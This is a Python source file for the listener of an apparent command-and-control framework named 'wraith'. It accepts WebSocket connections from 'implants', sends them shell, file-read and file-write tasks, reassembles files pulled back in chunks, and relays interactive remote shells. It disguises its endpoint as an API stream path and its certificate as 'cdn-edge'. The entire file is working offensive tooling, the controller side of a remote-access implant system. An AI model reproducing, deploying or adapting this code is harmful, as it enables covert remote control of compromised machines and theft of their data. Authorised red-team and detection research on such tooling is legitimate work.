"""Async WebSocket listener — accepts implants, multiplexes tasks and results."""

import asyncio
import json
import os
import secrets
import ssl as ssl_module
import tempfile
import threading
from urllib.parse import urlsplit, parse_qs

import websockets

from wraith import protocol
from wraith.sessions import SessionRegistry

CLOSE_UNAUTHORIZED = 4401
CLOSE_BAD_REGISTER = 4402
CLOSE_PROTOCOL_MISMATCH = 4403
REGISTER_TIMEOUT = 10
DEFAULT_INTERVAL = 30


def generate_token():
    return secrets.token_urlsafe(32)


def generate_endpoint():
    return f"/api/v2/streams/{secrets.token_hex(16)}"


class Listener:
    def __init__(self, host="127.0.0.1", port=8443, token=None, interval=DEFAULT_INTERVAL,
                 registry=None, exec_timeout=protocol.EXEC_TIMEOUT, endpoint_path=None,
                 tls=False, certfile=None, keyfile=None, on_event=None,
                 tags=None):
        self.host = host
        self.port = port
        self.token = token or generate_token()
        self.tags = tuple(protocol.clean_tags(tags)) if tags else (protocol.PROTOCOL_TAG,)
        self.interval = interval
        self.endpoint_path = endpoint_path or generate_endpoint()
        self.tls = tls
        self.certfile = certfile
        self.keyfile = keyfile
        self.on_event = on_event
        self.exec_timeout = exec_timeout
        self.registry = registry if registry is not None else SessionRegistry()
        self._server = None
        self._loop = None
        self._thread = None
        self._stop_event = None
        self._sockets = {}
        self._outboxes = {}
        self._futures = {}
        self._file_buffers = {}
        self._pty_mode = set()
        self._pty_sink = {}
        self.bound_port = None
        self._tls_ctx = None

    @property
    def running(self):
        return self._thread is not None and self._thread.is_alive()

    @property
    def scheme(self):
        return "wss" if self.tls else "ws"

    @property
    def url(self):
        if self.bound_port is None:
            return None
        host = self.host if self.host not in ("0.0.0.0", "::") else "127.0.0.1"
        return f"{self.scheme}://{host}:{self.bound_port}{self.endpoint_path}"

    # ── lifecycle ────────────────────────────────────────────────────────
    def start(self):
        if self.running:
            raise RuntimeError("listener already running")
        self._stop_event = threading.Event()
        self._thread = threading.Thread(target=self._run, name="wraith-listener", daemon=True)
        self._thread.start()
        for _ in range(200):
            if self.bound_port is not None:
                return
            if not self._thread.is_alive():
                break
            threading.Event().wait(0.05)
        if self.bound_port is None:
            raise RuntimeError("listener failed to start")

    def stop(self):
        if self._stop_event:
            self._stop_event.set()
        if self._loop and self._server:
            self._loop.call_soon_threadsafe(self._server.close)
        if self._thread:
            self._thread.join(timeout=5)
        self._thread = None
        self.bound_port = None

    def _run(self):
        self._loop = asyncio.new_event_loop()
        asyncio.set_event_loop(self._loop)
        self._loop.run_until_complete(self._serve())
        self._loop.run_forever()

    async def _serve(self):
        kwargs = {
            "max_size": protocol.MAX_MESSAGE_BYTES,
            "ping_interval": 20,
            "ping_timeout": 20,
        }
        if self.tls:
            self._tls_ctx = self._build_tls_context()
            kwargs["ssl"] = self._tls_ctx
        self._server = await websockets.serve(self._handler, self.host, self.port, **kwargs)
        self.bound_port = self._server.sockets[0].getsockname()[1]
        while not self._stop_event.is_set():
            await asyncio.sleep(0.2)
        for ws in list(self._sockets.values()):
            await ws.close()
        result = self._server.close()
        if asyncio.iscoroutine(result):
            await result
        closed = getattr(self._server, "wait_closed", None)
        if closed:
            outcome = closed()
            if asyncio.iscoroutine(outcome):
                await outcome
        self._loop.stop()

    def _build_tls_context(self):
        if self.certfile and self.keyfile:
            ctx = ssl_module.SSLContext(ssl_module.PROTOCOL_TLS_SERVER)
            ctx.load_cert_chain(self.certfile, self.keyfile)
            return ctx
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import ec
        import datetime
        import ipaddress

        key = ec.generate_private_key(ec.SECP256R1())
        subject = issuer = x509.Name([x509.NameAttribute(NameOID.COMMON_NAME, "cdn-edge")])
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=1))
            .not_valid_after(datetime.datetime.now(datetime.timezone.utc) + datetime.timedelta(days=365))
            .add_extension(
                x509.SubjectAlternativeName(
                    [x509.DNSName("localhost"),
                     x509.IPAddress(ipaddress.ip_address("127.0.0.1"))]
                ),
                critical=False,
            )
            .sign(key, hashes.SHA256())
        )
        tls_dir = tempfile.mkdtemp(prefix="wraith-tls-")
        cert_path = os.path.join(tls_dir, "cert.pem")
        key_path = os.path.join(tls_dir, "key.pem")
        with open(cert_path, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        with open(key_path, "wb") as f:
            f.write(key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption(),
            ))
        ctx = ssl_module.SSLContext(ssl_module.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert_path, key_path)
        return ctx

    # ── events ───────────────────────────────────────────────────────────
    def _emit(self, event):
        if self.on_event:
            try:
                self.on_event(event)
            except Exception:
                pass

    # ── handshake + pump ─────────────────────────────────────────────────
    def _authorized(self, ws):
        if not self.token:
            return True
        path = getattr(ws.request, "path", "") or ""
        split = urlsplit(path)
        if self.endpoint_path and split.path != self.endpoint_path:
            return False
        query = parse_qs(split.query).get("token", [""])[0]
        return query == self.token

    def _addr(self, ws):
        info = getattr(ws, "remote_address", None)
        return f"{info[0]}:{info[1]}" if info else "unknown"

    async def _handler(self, ws):
        if not self._authorized(ws):
            await ws.close(code=CLOSE_UNAUTHORIZED, reason="unauthorized")
            return
        try:
            raw = await asyncio.wait_for(ws.recv(), timeout=REGISTER_TIMEOUT)
        except Exception:
            await ws.close(code=CLOSE_BAD_REGISTER, reason="expected register")
            return
        msg = protocol.parse(raw)
        if not msg or msg["type"] != "register":
            await ws.close(code=CLOSE_BAD_REGISTER, reason="expected register")
            return

        implant_tags = protocol.clean_tags(msg.get("tags") or [])
        if not set(implant_tags) & set(self.tags):
            await ws.close(code=CLOSE_PROTOCOL_MISMATCH, reason="protocol tag mismatch")
            return
        sess = self.registry.register(
            {"sid": protocol.new_session_id(), **msg, "tags": implant_tags},
            self._addr(ws),
        )
        self._sockets[sess.sid] = ws
        self._outboxes[sess.sid] = asyncio.Queue()
        self._futures[sess.sid] = {}
        self._emit(("up", sess))
        try:
            await ws.send(json.dumps(protocol.welcome_message(sess.sid, self.interval, tags=self.tags)))
            await self._pump(ws, sess)
        except Exception:
            pass
        finally:
            self._sockets.pop(sess.sid, None)
            self._outboxes.pop(sess.sid, None)
            self._pty_mode.discard(sess.sid)
            self._pty_sink.pop(sess.sid, None)
            self._file_buffers.pop(sess.sid, None)
            pending = self._futures.pop(sess.sid, {})
            for fut in pending.values():
                if not fut.done():
                    fut.set_result({"ok": False, "error": "session closed"})
            self.registry.mark_lost(sess.sid)
            self._emit(("down", sess))

    async def _pump(self, ws, sess):
        recv_task = asyncio.ensure_future(ws.recv())
        while True:
            getter = asyncio.ensure_future(self._outboxes[sess.sid].get())
            done, pending = await asyncio.wait(
                {recv_task, getter}, return_when=asyncio.FIRST_COMPLETED
            )
            if getter in done:
                task_msg = getter.result()
                await ws.send(json.dumps(task_msg))
                getter = None
            else:
                getter.cancel()
            if recv_task in done:
                try:
                    raw = recv_task.result()
                except Exception:
                    return
                if raw is None:
                    return
                self.registry.touch(sess.sid)
                if sess.sid in self._pty_mode:
                    self._on_pty_frame(sess, raw)
                else:
                    self._on_frame(sess, raw)
                recv_task = asyncio.ensure_future(ws.recv())

    def _on_frame(self, sess, raw):
        msg = protocol.parse(raw)
        if msg is None:
            return
        kind = msg["type"]
        if kind == "result":
            task_id = msg.get("task_id")
            if msg.get("parts") is not None:
                self._on_file_part(sess, msg)
                return
            fut = self._futures.get(sess.sid, {}).pop(task_id, None)
            payload = {"ok": bool(msg.get("ok")), "out": msg.get("out", ""), "task_id": task_id}
            sess.results.append(payload)
            if fut and not fut.done():
                fut.set_result(payload)
        elif kind in ("beat", "bye"):
            self.registry.touch(sess.sid)

    def _on_file_part(self, sess, msg):
        task_id = msg.get("task_id")
        if not msg.get("ok", True):
            text = (protocol.b64_decode(msg.get("data") or "") or b"").decode("utf-8", "replace")
            fut = self._futures.get(sess.sid, {}).pop(task_id, None)
            payload = {"ok": False, "error": text or "transfer failed", "out": text, "task_id": task_id}
            sess.results.append({"ok": False, "out": text})
            if fut and not fut.done():
                fut.set_result(payload)
            return
        buffers = self._file_buffers.setdefault(sess.sid, {})
        buf = buffers.setdefault(task_id, {"chunks": {}, "parts": msg.get("parts"), "error": False})
        data = protocol.b64_decode(msg.get("data") or "")
        if data is None:
            buf["error"] = True
        buf["chunks"][msg.get("part", 0)] = data or b""
        parts = buf.get("parts") or 0
        done = msg.get("done") or (parts and len(buf["chunks"]) >= parts)
        if not done:
            return
        buffers.pop(task_id, None)
        body = b"".join(buf["chunks"][k] for k in sorted(buf["chunks"]))[:protocol.MAX_FILE_BYTES]
        fut = self._futures.get(sess.sid, {}).pop(task_id, None)
        payload = {"ok": not buf["error"], "out": "", "task_id": task_id, "data": body}
        sess.results.append({"ok": payload["ok"], "out": f"[file {len(body)} bytes]"})
        if fut and not fut.done():
            fut.set_result(payload)

    def _on_pty_frame(self, sess, raw):
        msg = protocol.parse(raw)
        if msg and msg["type"] == "pty_out":
            data = protocol.b64_decode(msg.get("data") or "")
            sink = self._pty_sink.get(sess.sid)
            if sink and data:
                try:
                    self._loop.call_soon_threadsafe(sink, data)
                except Exception:
                    pass
        elif msg and msg["type"] == "result":
            self._on_frame(sess, raw)

    # ── tasking ──────────────────────────────────────────────────────────
    def submit(self, sid, action, argv=None, data=None, timeout=None, part=None, parts=None):
        if self._loop is None:
            raise RuntimeError("listener not running")
        return asyncio.run_coroutine_threadsafe(
            self._submit(sid, action, argv, data, timeout, part, parts), self._loop
        )

    async def _submit(self, sid, action, argv=None, data=None, timeout=None, part=None, parts=None):
        timeout = self.exec_timeout if timeout is None else max(30, timeout)
        ws = self._sockets.get(sid)
        if ws is None:
            return {"ok": False, "error": "session not connected"}
        if action not in protocol.ACTIONS:
            return {"ok": False, "error": f"unknown action: {action}"}
        clean = protocol.sanitize_argv(argv or [])
        if clean is None and action in ("shell", "read_file", "write_file", "pty_open"):
            return {"ok": False, "error": "invalid argv"}
        task = protocol.task_message(protocol.new_task_id(), action, clean, data=data,
                                     part=part, parts=parts)
        fut = self._loop.create_future()
        self._futures[sid][task["task_id"]] = fut
        sess = self.registry.get(sid)
        if sess:
            sess.pending += 1
        await self._outboxes[sid].put(task)
        try:
            return await asyncio.wait_for(fut, timeout=timeout)
        except asyncio.TimeoutError:
            return {"ok": False, "error": f"task timed out after {timeout}s", "task_id": task["task_id"]}
        finally:
            self._futures.get(sid, {}).pop(task["task_id"], None)
            if sess:
                sess.pending -= 1

    # ── pty ──────────────────────────────────────────────────────────────
    def pty_open(self, sid, shell_path=None, timeout=20):
        return self.submit(sid, "pty_open", argv=[shell_path or "system"], timeout=timeout)

    def pty_input(self, sid, data: bytes):
        if self._loop is None:
            raise RuntimeError("listener not running")
        return asyncio.run_coroutine_threadsafe(self._pty_send(sid, data), self._loop)

    async def _pty_send(self, sid, data: bytes):
        ws = self._sockets.get(sid)
        if ws is None:
            return False
        encoded = protocol.b64_encode(data)
        limit = protocol.MAX_MESSAGE_BYTES // 2
        for i in range(0, len(encoded), limit):
            await ws.send(json.dumps(protocol.pty_in_message(encoded[i:i + limit])))
        return True

    def pty_close(self, sid):
        if self._loop is None:
            raise RuntimeError("listener not running")
        return asyncio.run_coroutine_threadsafe(self._pty_close(sid), self._loop)

    async def _pty_close(self, sid):
        ws = self._sockets.get(sid)
        if ws:
            try:
                await ws.send(json.dumps(protocol.pty_end_message()))
            except Exception:
                pass
        self._pty_mode.discard(sid)
        self._pty_sink.pop(sid, None)
        return True

    def hook_pty_sink(self, sid, callback):
        self._pty_sink[sid] = callback
        self._pty_mode.add(sid)
